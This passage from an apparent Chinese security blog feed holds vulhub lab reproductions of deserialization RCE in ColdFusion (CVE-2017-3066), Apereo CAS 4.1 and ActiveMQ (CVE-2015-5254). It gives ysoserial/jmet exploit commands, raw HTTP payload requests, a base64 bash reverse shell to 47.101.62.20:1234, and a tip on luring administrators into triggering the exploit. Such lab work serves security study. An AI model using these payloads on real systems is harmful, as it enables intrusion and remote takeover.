&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020101201.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;文件夹名解析漏洞&quot;&gt;&lt;a href=&quot;#文件夹名解析漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件夹名解析漏洞&quot;&gt;&lt;/a&gt;文件夹名解析漏洞&lt;/h3&gt;&lt;p&gt;该版本默认会将&lt;code&gt;*.asp/&lt;/code&gt;目录下的所有文件当成&lt;code&gt;Asp&lt;/code&gt;解析。&lt;/p&gt;</summary>
    
    
    
    <category term="Web基础" scheme="https://hzktester.top/categories/Web%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="中间件" scheme="https://hzktester.top/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</title>
    <link href="https://hzktester.top/posts/ca77975b.html"/>
    <id>https://hzktester.top/posts/ca77975b.html</id>
    <published>2020-10-10T08:34:00.000Z</published>
    <updated>2020-10-20T09:21:51.048Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><code>Adobe ColdFusion</code>是美国<code>Adobe</code>公司的一款动态Web服务器产品，其运行的<code>CFML（ColdFusion Markup Language）</code>是针对Web应用的一种程序设计语言。</p><p><code>Adobe ColdFusion</code>中存在<code>java</code>反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：<code>Adobe ColdFusion (2016 release) Update 3</code>及之前的版本，<code>ColdFusion 11 Update 11</code>及之前的版本，<code>oldFusion 10 Update 22</code>及之前的版本。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>使用<code>vulhub</code>启动漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;vulhub&#x2F;coldfusion&#x2F;CVE-2017-3066&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>等待数分钟时间，环境启动成功，访问<code>http://your-ip:8500/CFIDE/administrator/index.cfm</code>，输入密码<code>vulhub</code>，即可成功安装<code>Adobe ColdFusion</code></p><p><img src="https://qiniu.hzktester.top/tp2020101013.png" alt="image"></p><p>安装成功后页面如下：</p><p><img src="https://qiniu.hzktester.top/tp2020101014.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用<a href="https://github.com/codewhitesec/ColdFusionPwn">ColdFusionPwn</a>工具来生成POC：</p><p>同时获取最新版的<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">ysoserial</a>。放在同一目录下</p><p>生成POC（执行命令<code>touch /tmp/success</code>）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#39;touch &#x2F;tmp&#x2F;success&#39; poc.ser</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101015.png" alt="image"></p><p>POC生成于<code>poc.ser</code>文件中，将POC作为数据包body发送给<code>http://your-ip:8500/flex2gateway/amf</code>，<code>Content-Type</code>为<code>application/x-amf</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;flex2gateway&#x2F;amf HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8500</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-amf</span><br><span class="line">Content-Length: 2853</span><br><span class="line"></span><br><span class="line">[...poc...]</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101016.png" alt="image"></p><p>进入容器中，发现<code>/tmp/success</code>已成功创建：</p><p><img src="https://qiniu.hzktester.top/tp2020101017.png" alt="image"></p><p>接下来试一下反弹<code>shell</code>（生成一个反弹shell的poc）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNjIuMjAvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39; shell.ser</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101018.png" alt="image"></p><p>使用<code>curl</code>命令提交poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;47.101.62.20:8500&#x2F;flex2gateway&#x2F;amf --data-binary @shell.ser</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101019.png" alt="image"></p><p>成功反弹shell：</p><p><img src="https://qiniu.hzktester.top/tp2020101020.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞详情&quot;&gt;&lt;a href=&quot;#漏洞详情&quot; class=&quot;headerlink&quot; title=&quot;漏洞详情&quot;&gt;&lt;/a&gt;漏洞详情&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Adobe ColdFusion&lt;/code&gt;是美国&lt;code&gt;Adobe&lt;/code&gt;公司的一款动态Web服务器产品，其运行的&lt;code&gt;CFML（ColdFusion Markup Language）&lt;/code&gt;是针对Web应用的一种程序设计语言。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Adobe ColdFusion&lt;/code&gt;中存在&lt;code&gt;java&lt;/code&gt;反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：&lt;code&gt;Adobe ColdFusion (2016 release) Update 3&lt;/code&gt;及之前的版本，&lt;code&gt;ColdFusion 11 Update 11&lt;/code&gt;及之前的版本，&lt;code&gt;oldFusion 10 Update 22&lt;/code&gt;及之前的版本。&lt;/p&gt;
&lt;h2 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h2&gt;&lt;p&gt;使用&lt;code&gt;vulhub&lt;/code&gt;启动漏洞环境&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd &amp;#x2F;root&amp;#x2F;vulhub&amp;#x2F;coldfusion&amp;#x2F;CVE-2017-3066&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;等待数分钟时间，环境启动成功，访问&lt;code&gt;http://your-ip:8500/CFIDE/administrator/index.cfm&lt;/code&gt;，输入密码&lt;code&gt;vulhub&lt;/code&gt;，即可成功安装&lt;code&gt;Adobe ColdFusion&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020101013.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;安装成功后页面如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020101014.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Adobe ColdFusion" scheme="https://hzktester.top/tags/Adobe-ColdFusion/"/>
    
  </entry>
  
  <entry>
    <title>Apereo CAS 4.1 反序列化命令执行漏洞</title>
    <link href="https://hzktester.top/posts/a52bba00.html"/>
    <id>https://hzktester.top/posts/a52bba00.html</id>
    <published>2020-10-10T03:40:00.000Z</published>
    <updated>2020-10-20T09:21:51.049Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><code>Apereo CAS</code>是一款<code>Apereo</code>发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用<code>vulhub</code>启动漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;vulhub&#x2F;apereo-cas&#x2F;4.1-rce&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8080/cas/login</code>即可查看到登录页面。</p><p><img src="https://qiniu.hzktester.top/tp2020101009.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞原理是<code>Webflow</code>中使用了默认密钥<code>changeit</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class EncryptedTranscoder implements Transcoder &#123;</span><br><span class="line">    private CipherBean cipherBean;</span><br><span class="line">    private boolean compression &#x3D; true;</span><br><span class="line"></span><br><span class="line">    public EncryptedTranscoder() throws IOException &#123;</span><br><span class="line">        BufferedBlockCipherBean bufferedBlockCipherBean &#x3D; new BufferedBlockCipherBean();</span><br><span class="line">        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&quot;AES&quot;, &quot;CBC&quot;, &quot;PKCS7&quot;));</span><br><span class="line">        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());</span><br><span class="line">        bufferedBlockCipherBean.setKeyAlias(&quot;aes128&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setKeyPassword(&quot;changeit&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setNonce(new RBGNonce());</span><br><span class="line">        this.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; ...</span><br></pre></td></tr></table></figure><p>我们使用<a href="https://github.com/vulhub/Apereo-CAS-Attack">Apereo-CAS-Attack</a>来复现这个漏洞。使用<code>ysoserial</code>的<code>CommonsCollections4</code>生成加密后的<code>Payload</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch &#x2F;tmp&#x2F;success&quot;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101010.png" alt="image"></p><p>然后登录<code>CAS</code>并抓包，将<code>Body</code>中的<code>execution</code>值替换成上面生成的<code>Payload</code>发送：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;cas&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Length: 2287</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;your-ip:8080</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.89 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;your-ip:8080&#x2F;cas&#x2F;login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en,zh-CN;q&#x3D;0.9,zh;q&#x3D;0.8</span><br><span class="line">Cookie: JSESSIONID&#x3D;24FB4BAAE1A66E8B76D521EE366B3E12; _ga&#x3D;GA1.1.1139210877.1586367734</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username&#x3D;test&amp;password&#x3D;test&amp;lt&#x3D;LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&amp;execution&#x3D;[payload]&amp;_eventId&#x3D;submit&amp;submit&#x3D;LOGIN</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101011.png" alt="image"></p><p>进入容器，可见<code>touch /tmp/success</code>已成功执行：</p><p><img src="https://qiniu.hzktester.top/tp2020101012.png" alt="image"></p><p>反弹<code>shell</code>只需将<code>touch /tmp/success</code>替换即可</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞详情&quot;&gt;&lt;a href=&quot;#漏洞详情&quot; class=&quot;headerlink&quot; title=&quot;漏洞详情&quot;&gt;&lt;/a&gt;漏洞详情&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Apereo CAS&lt;/code&gt;是一款&lt;code&gt;Apereo&lt;/code&gt;发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。&lt;/p&gt;
&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;使用&lt;code&gt;vulhub&lt;/code&gt;启动漏洞环境&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd &amp;#x2F;root&amp;#x2F;vulhub&amp;#x2F;apereo-cas&amp;#x2F;4.1-rce&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;环境启动后，访问&lt;code&gt;http://your-ip:8080/cas/login&lt;/code&gt;即可查看到登录页面。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020101009.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;漏洞原理是&lt;code&gt;Webflow&lt;/code&gt;中使用了默认密钥&lt;code&gt;changeit&lt;/code&gt;：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;public class EncryptedTranscoder implements Transcoder &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    private CipherBean cipherBean;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    private boolean compression &amp;#x3D; true;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    public EncryptedTranscoder() throws IOException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        BufferedBlockCipherBean bufferedBlockCipherBean &amp;#x3D; new BufferedBlockCipherBean();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&amp;quot;AES&amp;quot;, &amp;quot;CBC&amp;quot;, &amp;quot;PKCS7&amp;quot;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bufferedBlockCipherBean.setKeyAlias(&amp;quot;aes128&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bufferedBlockCipherBean.setKeyPassword(&amp;quot;changeit&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bufferedBlockCipherBean.setNonce(new RBGNonce());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        this.setCipherBean(bufferedBlockCipherBean);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#x2F;&amp;#x2F; ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Apereo CAS" scheme="https://hzktester.top/tags/Apereo-CAS/"/>
    
  </entry>
  
  <entry>
    <title>ActiveMQ 反序列化漏洞（CVE-2015-5254）</title>
    <link href="https://hzktester.top/posts/5632f60a.html"/>
    <id>https://hzktester.top/posts/5632f60a.html</id>
    <published>2020-10-10T02:32:00.000Z</published>
    <updated>2020-10-20T09:21:51.046Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><code>Apache ActiveMQ</code>是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持<code>Java</code>消息服务、集群、<code>Spring Framework</code>等。</p><p><code>Apache ActiveMQ 5.13.0</code>之前<code>5.x</code>版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的<code>Java Message Service(JMS)ObjectMessage</code>对象利用该漏洞执行任意代码。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>使用<code>vulhub</code>运行漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub&#x2F;activemq&#x2F;CVE-2015-5254&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境运行后，将监听<code>61616</code>和<code>8161</code>两个端口。其中<code>61616</code>是工作端口，消息在这个端口进行传递；<code>8161</code>是Web管理页面端口。访问<code>http://your-ip:8161</code>即可看到web管理页面，不过这个漏洞理论上是不需要web的。</p><p><img src="https://qiniu.hzktester.top/tp2020101001.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞利用过程如下：</p><ol><li>构造（可以使用<code>ysoserial</code>）可执行命令的序列化对象</li><li>作为一个消息，发送给目标<code>61616</code>端口</li><li>访问web管理页面，读取消息，触发漏洞</li></ol><p>使用<a href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载<code>jmet</code>的jar文件，并在同目录下创建一个<code>external</code>文件夹（否则可能会报文件夹不存在的错误）。</p><p><img src="https://qiniu.hzktester.top/tp2020101002.png" alt="image"></p><p><code>jmet</code>原理是使用<code>ysoserial</code>生成<code>Payload</code>并发送（其<code>jar</code>内自带<code>ysoserial</code>，无需再自己下载），所以我们需要在<code>ysoserial</code>是<code>gadget</code>中选择一个可以使用的，比如<code>ROME</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME 47.101.62.20 61616</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101003.png" alt="image"></p><p>此时会给目标<code>ActiveMQ</code>添加一个名为<code>event</code>的队列，我们可以通过<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息：</p><p>默认的用户名和密码为<code>admin</code>，<code>admin</code></p><p><img src="https://qiniu.hzktester.top/tp2020101004.png" alt="image"></p><p>点击这条消息即可触发命令，此时进入容器<code>docker-compose exec activemq bash</code>，可见<code>/tmp/success</code>已成功创建，说明漏洞利用成功：</p><p><img src="https://qiniu.hzktester.top/tp2020101005.png" alt="image"></p><p>将命令替换成弹<code>shell</code>语句再利用：</p><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">Java Runtime</a> 配合<code>bash</code>编码</p><p><img src="https://qiniu.hzktester.top/tp2020101006.png" alt="image"></p><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNjIuMjAvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 47.101.62.20 61616</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020101007.png" alt="image"></p><p>反弹shell:</p><p><img src="https://qiniu.hzktester.top/tp2020101008.png" alt="image"></p><blockquote><p>值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞详情&quot;&gt;&lt;a href=&quot;#漏洞详情&quot; class=&quot;headerlink&quot; title=&quot;漏洞详情&quot;&gt;&lt;/a&gt;漏洞详情&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Apache ActiveMQ&lt;/code&gt;是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持&lt;code&gt;Java&lt;/code&gt;消息服务、集群、&lt;code&gt;Spring Framework&lt;/code&gt;等。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Apache ActiveMQ 5.13.0&lt;/code&gt;之前&lt;code&gt;5.x&lt;/code&gt;版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的&lt;code&gt;Java Message Service(JMS)ObjectMessage&lt;/code&gt;对象利用该漏洞执行任意代码。&lt;/p&gt;
&lt;h2 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h2&gt;&lt;p&gt;使用&lt;code&gt;vulhub&lt;/code&gt;运行漏洞环境&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd vulhub&amp;#x2F;activemq&amp;#x2F;CVE-2015-5254&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;环境运行后，将监听&lt;code&gt;61616&lt;/code&gt;和&lt;code&gt;8161&lt;/code&gt;两个端口。其中&lt;code&gt;61616&lt;/code&gt;是工作端口，消息在这个端口进行传递；&lt;code&gt;8161&lt;/code&gt;是Web管理页面端口。访问&lt;code&gt;http://your-ip:8161&lt;/code&gt;即可看到web管理页面，不过这个漏洞理论上是不需要web的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020101001.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;漏洞利用过程如下：&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="ActiveMQ" scheme="https://hzktester.top/tags/ActiveMQ/"/>
    
  </entry>
  
  <entry>
    <title>JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</title>
    <link href="https://hzktester.top/posts/38bd85b0.html"/>
    <id>https://hzktester.top/posts/38bd85b0.html</id>
    <published>2020-10-09T09:14:00.000Z</published>
    <updated>2020-10-20T09:21:51.051Z</updated>
    
